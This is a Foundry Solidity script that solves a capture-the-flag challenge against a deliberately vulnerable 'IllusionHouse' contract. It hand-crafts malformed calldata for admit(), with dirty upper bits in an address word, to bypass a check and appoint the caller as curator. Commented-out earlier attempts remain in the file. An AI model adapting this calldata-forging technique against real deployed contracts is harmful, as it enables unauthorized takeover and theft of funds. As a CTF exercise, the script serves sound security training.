// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Script, console} from "forge-std/Script.sol";
import { IllusionHouse, MirrorProxy, Setup } from "../src/CTF/vulnerable/Setup.sol";

contract ShogunKiller is Script {
	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    Setup setup = new Setup(me);
    // Setup setup = Setup(0xC586357B1d13bcd457FF015a831E543f088dF4b0);
    IllusionHouse instance = IllusionHouse(setup.house());
    MirrorProxy proxy = setup.proxy();

    bytes32 public constant SIGIL_PREIMAGE = bytes32("0xAnan or Tensai?");

    bytes32 private constant IMPLEMENTATION_SLOT =
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    function run() external {
        vm.startBroadcast(prv);
        
        console.log(setup.isSolved());

        // address implementation = address(
        //     uint160(
        //         uint256(
        //             vm.load(address(proxy), IMPLEMENTATION_SLOT)
        //         )
        //     )
        // );
        // implementation.call(abi.encodeWithSignature("initialize(address)", me));

        // bytes memory payload = bytes.concat(
        //     bytes4(keccak256("admit(address,bytes)")),
        //     bytes32(uint256(uint160(me))),
        //     bytes.concat("")
        // );

        // console.logBytes((payload));
        
        // (bool ok, bytes memory x) = address(instance).call(
        //     payload
        // );
        // // .admit(me, hex"00");
        // console.logBytes((x));


        // f5b1e981
        // 000000000000000000000000f3e92f7256e008dc960af62fb27d1ce73692a9e5
        // 0000000000000000000000000000000000000000000000000000000000000040
        // 0000000000000000000000000000000000000000000000000000000000000000

        // // bytes memory x = instance.admit(me, "");
        // address(instance).call(
        //     hex"f5b1e981000000000000000000000000f3e92f7256e008dc960af62fb27d1ce73692a9e500000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000"
        // );


        


uint96 rank = 12345;

        // bottom 160 bits can be anything
        bytes32 sigilWord =
            bytes32((uint256(rank) << 160) | uint160(0xdeadbeef));

        // must satisfy keccak256(sigil) == SIGIL_HASH
        bytes memory sigil = abi.encodePacked(sigilWord);

        // =========================
        // 2️⃣ Patron word abuse
        // =========================
        // upper 96 bits MUST be non-zero
        uint256 patronWord =
            (uint256(0x111111111111111111111111) << 160) |
            uint160(address(instance));

        // =========================
        // 3️⃣ Build calldata manually
        // =========================
        bytes4 selector = bytes4(
            keccak256("admit(address,bytes)")
        );

        bytes memory calldataPayload = abi.encodePacked(
            selector,
            bytes32(patronWord),   // msg.data[4:36]
            bytes32(uint256(0x20)),// msg.data[36:68] offset
            sigilWord               // msg.data[68:100]
        );


        // bytes memory myCalldataPayload = bytes.concat(
        //     bytes4(0xf5b1e981),
        //     bytes12(uint96(1)),
        //     bytes20(uint160(address(instance))),
        //     bytes32(0x0000000000000000000000000000000000000000000000000000000000000020),
        //     bytes32(abi.encodePacked(SIGIL_PREIMAGE))
        // );

        (bool ok, bytes memory x) = address(instance).call(
            calldataPayload
        );

        console.logBytes(x);
        // 000000000000000000000000f3e92f7256e008dc960af62fb27d1ce73692a9e5

        instance.appointCurator(me);

        console.log(setup.isSolved());
        // instance.initialize(me);

        vm.stopBroadcast();
    }

}

